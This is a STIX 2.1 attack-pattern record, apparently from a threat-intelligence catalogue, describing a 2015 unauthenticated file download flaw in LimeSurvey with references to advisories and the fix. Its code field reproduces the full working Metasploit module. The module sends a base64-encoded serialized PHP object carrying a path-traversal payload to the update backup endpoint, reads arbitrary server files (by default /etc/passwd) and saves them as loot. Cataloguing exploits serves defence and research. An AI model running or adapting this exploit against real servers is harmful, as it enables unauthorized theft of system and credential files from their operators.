{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b64c85fc-ea61-41b2-87b5-e15501d40325",
    "created": "2024-08-14T16:24:03.860233Z",
    "modified": "2024-08-14T16:24:03.860237Z",
    "name": "Limesurvey Unauthenticated File Download",
    "description": " This module exploits an unauthenticated file download vulnerability in limesurvey between 2.0+ and 2.06+ Build 151014. The file is downloaded as a ZIP and unzipped automatically, thus binary files can be downloaded. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/limesurvey_file_download.rb",
            "external_id": "limesurvey_file_download.rb"
        },
        {
            "source_name": "reference",
            "url": "https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-lime-survey/"
        },
        {
            "source_name": "reference",
            "url": "https://www.limesurvey.org/blog/22-security/136-limesurvey-security-advisory-10-2015"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/LimeSurvey/LimeSurvey/compare/2.06_plus_151014...2.06_plus_151016?w=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# for extracting files\nrequire 'zip'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Limesurvey Unauthenticated File Download',\n        'Description' => %q{\n          This module exploits an unauthenticated file download vulnerability\n          in limesurvey between 2.0+ and 2.06+ Build 151014. The file is downloaded\n          as a ZIP and unzipped automatically, thus binary files can be downloaded.\n        },\n        'Author' => [\n          'Pichaya Morimoto', # Vulnerability Discovery\n          'Christian Mehlmauer' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-lime-survey/'],\n          ['URL', 'https://www.limesurvey.org/blog/22-security/136-limesurvey-security-advisory-10-2015'],\n          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/compare/2.06_plus_151014...2.06_plus_151016?w=1']\n        ],\n        'DisclosureDate' => '2015-10-12'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'The base path to the limesurvey installation', '/']),\n        OptString.new('FILEPATH', [true, 'Path of the file to download', '/etc/passwd']),\n        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 15])\n      ]\n    )\n  end\n\n  def filepath\n    datastore['FILEPATH']\n  end\n\n  def traversal_depth\n    datastore['TRAVERSAL_DEPTH']\n  end\n\n  def payload\n    traversal = '/..' * traversal_depth\n    file = \"#{traversal}#{filepath}\"\n    serialized = 'a:1:{i:0;O:16:\"CMultiFileUpload\":1:{s:4:\"file\";s:' + file.length.to_s + ':\"' + file + '\";}}'\n    Rex::Text.encode_base64(serialized)\n  end\n\n  def unzip_file(zipfile)\n    zip_data = Hash.new\n    begin\n      Zip::File.open_buffer(zipfile) do |filezip|\n        filezip.each do |entry|\n          zip_data[::File.expand_path(entry.name)] = filezip.read(entry)\n        end\n      end\n    rescue Zip::Error => e\n      print_error(\"Error extracting ZIP: #{e}\")\n    end\n    return zip_data\n  end\n\n  def run\n    csrf_token = Rex::Text.rand_text_alpha(10)\n\n    vars_post = {\n      'YII_CSRF_TOKEN' => csrf_token,\n      'destinationBuild' => Rex::Text.rand_text_alpha(5),\n      'datasupdateinfo' => payload\n    }\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'index.php', 'admin', 'update', 'sa', 'backup'),\n      'cookie' => \"YII_CSRF_TOKEN=#{csrf_token}\",\n      'vars_post' => vars_post\n    })\n\n    if res && res.code == 200 && res.body && res.body.include?('Download this file')\n      match = res.body.match(%r{<div class=\"updater-background\">\\s+<p class=\"success \" style=\"text-align: left;\">\\s+<strong>[^<]+</strong>\\s+<br/>\\s+([^<]+)<br/>\\s+<a class=\"btn btn-success\" href=\"([^\"]+)\" title=\"Download this file\">Download this file</a>})\n      if match\n        local_path = match[1]\n        download_url = match[2]\n        print_status(\"File saved to #{local_path}\")\n        print_status(\"Downloading backup from URL #{download_url}\")\n\n        res = send_request_cgi({\n          'method' => 'GET',\n          'uri' => download_url\n        })\n\n        if res && res.code == 200\n          unzipped = unzip_file(res.body)\n\n          unzipped.each do |filename, content|\n            print_good(\"Filename: #{filename}\")\n            print_good(content)\n\n            path = store_loot(\n              'limesurvey.http',\n              'application/octet-stream',\n              rhost,\n              content,\n              filename\n            )\n            print_good(\"File saved in: #{path}\")\n          end\n        else\n          print_error('Failed to download file')\n        end\n      else\n        print_error('Failed to download file')\n      end\n    else\n      print_error('Failed to download file')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-12"
}